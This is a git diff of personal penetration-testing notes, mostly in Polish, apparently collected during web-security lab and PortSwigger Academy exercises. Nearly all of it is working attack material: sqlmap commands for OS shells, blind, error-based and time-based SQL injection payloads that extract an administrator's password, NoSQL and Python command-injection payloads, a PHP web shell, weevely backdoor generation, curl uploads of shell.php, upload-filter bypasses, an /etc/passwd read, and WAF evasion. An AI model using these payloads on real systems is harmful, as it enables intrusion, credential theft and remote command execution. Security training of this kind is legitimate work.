@@ -12,6 +12,9 @@ listy katalogow:
 /usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt
 /usr/share/seclists/fuzzing/xss/xss-brutelogic.txt
 lista w ZAPie: Type: File Fuzzers -> jbrofuzz -> sql injection -> select everything
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet (portswigger)
+https://portswigger.net/web-security/sql-injection/cheat-sheet (portswigger)
+
 
 payloady: 
 __import__('os').system('whoami | bash')  --python
@@ -62,11 +65,21 @@ sqlmap -r request.txt -p words_exact  --os-shell
 sqlmap -r request.txt -p words_exact  --os-pwn
 sqlmap -r request.txt -p words_exact  --current-user
 
+ciekawy przykład sqlmap (w miejsce * wrzucamy payload) : sqlmap -u "https://oqj83drzczi5z5v834xv64wey.eu-central-7.attackdefensecloudlabs.com/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3
+można też tak: sqlmap -u
+"http://jwjozxqhcwh31mcc4618w9cxs.stager3.attackdefenselabs.com/post.php?post=1" --dbs
+
+
 sqlmap -u "http://192.89.201.3:8000/results?rollno=100" -p rollno
 sqlmap -r request -p post # zapytanie GET
 sqlmap -u "http://jwjozxqhcwh31mcc4618w9cxs.stager3.attackdefenselabs.com/post.php?post=1" --dbs # to get database names on the server
 
 sqlmap -r request -p username
+
+Testowanie payloadów w cookie:
+sqlmap -r sql-p6 -p TrackingId --level=5 
+
+
 
 TEST SQL RECZNY
 a' or 1=1--
@@ -114,14 +127,14 @@ nmap --script mysql-empty-password -p 3306 192.173.248.3
 
 ! jak masz ataki na http to lepiej użyj burp niż hydra
 
-/usr/share/webshells/php/simple-backdoor.php
+/usr/share/webshells/php/simple-backdoor.php *GENIALNY
 
 
 !nowy tool:
 weevely generate
 weevely generate password ~/Desktop/weevely.jpg # generowanie web shella
 wchodizmy na url
-weevely https://strona.com/uploads/weevely.jpg/weevely.php password cmd i mamy taki shell interaktywny
+weevely https://strona.com/uploads/weevely.jpg/weevely.php password - i mamy taki shell interaktywny
 
 
 wpscan --url https://xyz.com/
@@ -131,6 +144,9 @@ ciekawa sciezka na wordpressie: /wp-content/uploads/wp-security-audit-log/
 gobuster dir --url https://.com/ --wordlist(s) /usr/share/seclists/discovery/web-content/wordpress.fuzz.txt -b '404'
 gobuster dir -u http://192.156.207.3 -w /usr/share/wordlists/dirb/common.txt -b
 403,404 -x .php,.xml,.txt -r # find .php,.xml,.txt files
+
+dodatkowo: gobuster -u http://192.168.1.101 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
+
 
 
 Work the Flow File Upload - 1.2.1 - w tutorialu było takie cos: Exploit DB Link: https://www.exploit-db.com/exploits/36640
@@ -161,6 +177,8 @@ NO SQL PAYLOAD (MongoDB):
 /?name[$ne]=bob
 $gt: "" }
 /?name[$gt]=a
+'||1||' - nowy payload z portswigger academy
+
 
 upload CURL:
 curl -F "Filedata=@./shell.php" https://1ln24fpvu02iqvbpk1bcirxp6.eu-central-6.attackdefensecloudlabs.com/wp-content/plugins/wpstorecart/php/upload.php
@@ -169,6 +187,8 @@ REKONESANS:
 dirb http://demo.ine.local
 dirb http://example.com /ścieżka/do/słownika.txt
 browsh --startup-url demo.ine.local (CTRL Q wyjście)
+
+possibly evade WAF: dirb http://target.com -a "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
 
 
 CURL/upload pliku:
@@ -245,9 +265,10 @@ mysql -u username -p -h hostname -P port database_name
 
 !omijanie filtra:
 dodajesz plik shell.jpg
-wywołujesz shell.jpg/shell.php
+wywołujesz shell.jpg/shell.php #To exploit the misconfiguration, append a filename ending with “.php” extension. By
+doing so, nginx will pass the shell.jpg file to the php handler and the php script will be executed
 
-! jak nie działa shell PHP to ładuj PHP5
+! jak nie działa shell PHP to ładuj PHP5 albo PHP7
 
 ! uwaga czasem robisz file upload na daną ścieżkę np. https://z4xb54bnnhqwhovphkeyhv3xn.eu-central-6.attackdefensecloudlabs.com/wp-content/plugins/wpstorecart/php/upload.php, ale wywołujesz inną ścieżką: https://z4xb54bnnhqwhovphkeyhv3xn.eu-central-6.attackdefensecloudlabs.com/wp-content/uploads/wpstorecart/shell.php?cmd=id
 
@@ -273,3 +294,122 @@ Wordpress WordPress Plugin Work The Flow - https://www.exploit-db.com/exploits/3
 CURL przez proxy:
 curl -H "User-Agent: Firefox" -x 192.21.234.3:3128 127.0.0.1:80
 
+Dodatkowe źródła:
+https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+https://brightsec.com/blog/cross-site-scripting-xss/ (cała lista sposobów na filter evasion w XSS)
+
+BLIND SQLI:
+MYSQL:
+TrackingId=ateXIMK7b8MuZSkq' and (SELECT 'a' FROM users LIMIT 1
+)='a
+TrackingId=ateXIMK7b8MuZSkq' and (SELECT username FROM users where username='administrator' LIMIT 1)='administrator
+TrackingId=ateXIMK7b8MuZSkq' and SUBSTRING((SELECT username FROM users where username='administrator' LIMIT 1),1,4)='admi
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+
+Burp Intruder REGEX
+to be able to tell when the correct character was submitted, you'll need to grep each response for the expression Welcome back. To do this, click on the Settings tab to open the Settings side panel. In the Grep - Match section, clear existing entries in the list, then add the value Welcome back.
+
+
+Error based SQLI
+ORACLE:
+
+TrackingId=xyz'||(SELECT '' FROM dual)||' 
+# znaki || tworzą konkatenacją stringów między selectami, jeśli oba selecty zwracają stringi to będzie bez błędów syntax, natomiast jeśli na przykład select drugi zwróci True lub False lub 1 to mamy syntax error 
+
+TrackingId=yMhxEJZS7U9JspaT' || (SELECT 'a' FROM users where ROWNUM=1)||'
+
+poniższe zwraca error:
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+poniższe nie zwraca błędu:
+TrackingId=yMhxEJZS7U9JspaT' || (SELECT CASE WHEN (2=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+# uwaga dzielenie przez 0 jeśli warunek w CASE jest prawdziwy, więc wtedy będzie error
+
+TrackingId=yMhxEJZS7U9JspaT' || (SELECT CASE WHEN (2=1) THEN TO_CHAR(1/0) ELSE '' END FROM users)||'
+
+zwraca błąd, czyli administrator istnieje
+TrackingId=yMhxEJZS7U9JspaT' || (SELECT CASE WHEN (username='administrator') THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||'
+
+nie zwraca błędu czyli adminxxistrator nie istnieje
+TrackingId=yMhxEJZS7U9JspaT' || (SELECT CASE WHEN (username='administrator') THEN TO_CHAR(1/0) ELSE '' END FROM users where username='adminxxxxistrator')||'
+
+ustalenie długości hasła:
+TrackingId=yMhxEJZS7U9JspaT' || (SELECT CASE WHEN LENGTH(password)=20 THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||';
+
+znajdowanie hasła:
+TrackingId=yMhxEJZS7U9JspaT' || (SELECT CASE WHEN SUBSTR(password,1,3)='jy§1§' THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||';
+
+
+
+PHP SHELL:
+echo "<?php \$output = shell_exec('id'); echo \"<pre>\$output</pre>\"; ?>" > ~/test2.php
+
+
+---Sposób na Content-Type filtering przy file upload---
+dodaj file do katalogu bieżącego .htaccess
+jako zawartość dodaj:
+AddType application/x-httpd-php .shell
+2) dodajemy plik shell.shell
+
+--payload php
+<?php echo file_get_contents('/etc/passwd'); ?>
+
+
+SQLI TIME BASED PAYLOAD
+TrackingId=rDxPN1qnAhCy68Br' || pg_sleep(10)--
+
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+
+SQLI tip:
+order by 4 # dobry sposób na identyfikacje liczby kolumn w tabeli
+inne payloads:
+union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() — 
+
+
+subdomains enum:
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt
+sudo wfuzz -c -f sub-fighter.txt -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --sc 200,202,204,301,302,307,403 <targetURL>
+
+wfuzz -c -f sub-fighter -w top5000.txt -u 'http://target.tld' -H "Host: FUZZ.target.tld" --hw 290 # eliminate response pages with wordcound=290
+
+! przy subdomenach może być potrzebna edycja hostsów
+
+SQLI next payload (time based):
+TrackingId=xxxx'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_SLEEP(0)+END--
+TrackingId=xxxx'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_SLEEP(0)+END+FROM+USERS--
+
+
+SQLI:
+
+www.vuln-web.com/photo.php?id=1" and sleep(10)--
+No delay
+www.vuln-web.com/photo.php?id=1" and sleep(10)#
+No delay
+www.vuln-web.com/photo.php?id=1" and sleep(10)/*
+No delay
+www.vuln-web.com/photo.php?id=1" and sleep(10)--+
+No delay
+www.vuln-web.com/photo.php?id=1 and sleep(10)--
+No delay
+www.vuln-web.com/photo.php?id=1 and sleep(10)#
+No delay
+www.vuln-web.com/photo.php?id=1 and sleep(10)/*
+No delay
+www.vuln-web.com/photo.php?id=1 and sleep(10)--+
+No delay
+www.vuln-web.com/photo.php?id=1' and sleep(10)--
+No Delay
+www.vuln-web.com/photo.php?id=1' and sleep(10)#
+Delay in page loading
+www.vuln-web.com/photo.php?id=1' and sleep(10)/*
+No delay
+www.vuln-web.com/photo.php?id=1' and sleep(10)--+
+No delay
+
+
+www.vuln-web.com/photo.php?id=1' and (select sleep(10) from dual where database() like '%')#
+
+##Subdomain discovery:
+sublist3r -d hackersploit.org # utilize search engines to find subdomains
+fierce --domain ine.com --subdomain-file fierce-hostlist.txt #subdomain bruteforce
